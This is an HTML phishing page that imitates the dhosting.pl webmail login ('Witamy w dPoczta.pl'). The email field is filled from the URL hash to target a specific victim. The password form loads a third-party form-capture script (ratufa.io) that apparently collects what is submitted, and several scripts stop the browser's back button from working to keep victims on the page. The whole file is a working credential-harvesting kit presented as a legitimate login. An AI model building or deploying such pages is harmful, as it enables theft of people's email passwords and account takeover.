<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dhosting.pl - Witamy w dPoczta.pl</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        .login-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            margin-top: -60px; /* Slight upward shift matching image layout */
        }

        /* Logo Area Graphic Reproduction */
        .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 2px;
            margin-bottom: 50px;
            font-size: 24px;
            font-weight: bold;
            color: #333333;
        }

        .logo-wrapper span.green-d {
            color: #006643;
        }

        .logo-wrapper span.gray-ext {
            color: #777777;
            font-weight: normal;
        }

        /* Title styling matching clean semi-bold font color */
        .form-title {
            font-size: 22px;
            font-weight: 500;
            color: #333333;
            margin-bottom: 24px;
        }

        form {
            width: 100%;
        }

        .form-group {
            margin-bottom: 16px;
            position: relative;
        }

        /* Distinctive Material-style field labels */
        .form-group label {
            position: absolute;
            left: 12px;
            top: -8px;
            background-color: #ffffff;
            padding: 0 6px;
            color: #777777;
            font-size: 11px;
            z-index: 5;
        }

        /* Custom light border input frames */
        .form-control {
            width: 100%;
            padding: 14px 16px;
            background-color: #ffffff;
            border: 1px solid #ced4da;
            border-radius: 6px;
            font-size: 14px;
            color: #333333;
            outline: none;
        }

        /* Active field with signature blue border */
        .form-group.active-field .form-control {
            border-color: #4a90e2;
        }

        .form-control::placeholder {
            color: #b0b0b0;
        }

        /* Dark Forest Green button precisely matching reference */
        .submit-btn {
            width: 100%;
            background-color: #005f43;
            color: #ffffff;
            border: none;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 4px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #004b34;
        }

        /* Forgot password styling link node */
        .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: #666666;
            font-size: 13px;
            text-decoration: underline;
        }

        .forgot-link:hover {
            color: #333333;
        }

        /* Base copyright watermark text segment */
        .page-footer {
            position: absolute;
            bottom: 24px;
            font-size: 11px;
            color: #999999;
            text-align: center;
            width: 100%;
        }

        /* Activate Windows Background System Watermark */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(0, 0, 0, 0.15);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Logo Header Component -->
        <div class="logo-wrapper">
            <span class="green-d">d</span>hosting<span class="gray-ext">.pl</span>
        </div>

        <!-- Section Title Text -->
        <h1 class="form-title">Witamy w dPoczta.pl</h1>
        <br><br><p><br>
        <!-- Interactive Form Layout Configuration -->
        <form action="" method="POST">
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
            <!-- Active blue-bordered field template example -->
            <div class="form-group active-field">
                <label for="username">Username</label>
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
            </div>
            
            <div class="form-group">
<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
            </div>
            
            <button type="submit" class="submit-btn">Login</button>
        </form>

        <a href="#" class="forgot-link">Forgot your password?</a>
    </div>

    <!-- Page Copyright Footer Information Strip -->
    <footer class="page-footer">
        Copyright © 2002-2026 dhosting.pl Sp. z o.o.
    </footer>

    <!-- Authentic Windows Overlay Layer Description Component -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
